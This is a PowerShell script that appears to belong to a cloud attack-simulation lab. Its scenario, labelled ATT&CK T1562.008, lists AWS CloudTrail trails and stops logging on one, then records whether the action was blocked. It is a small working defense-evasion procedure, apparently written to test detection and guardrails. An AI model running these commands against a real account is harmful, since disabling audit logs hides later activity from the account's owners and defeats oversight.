# Scenario 2: Defense evasion by stopping CloudTrail logging
# ATT&CK: T1562.008
. "$PSScriptRoot\common.ps1"

$Trail = Tf-Out trail_name
Use-Identity ops

Log 'Step 1: Enumerate trails'
$null = Attempt cloudtrail describe-trails --query 'trailList[].Name' --output text

Log "Step 2: Check whether $Trail is logging"
$null = Attempt cloudtrail get-trail-status --name $Trail --query IsLogging

Log 'Step 3: Stop logging'
if (-not (Attempt cloudtrail stop-logging --name $Trail)) { Finish blocked }

$Status = Get-Aws cloudtrail get-trail-status --name $Trail --query IsLogging --output text
if ($null -eq $Status) { $Status = 'unknown' }
Log "Trail IsLogging is now: $Status"
Warn 'Restore with: .\windows\reset.ps1 (re-applies enable_logging = true)'

if ($Status -eq 'False') { Finish succeeded }   # -eq is case-insensitive
Warn "StopLogging returned success but status is '$Status'. Treating as succeeded."
Finish succeeded
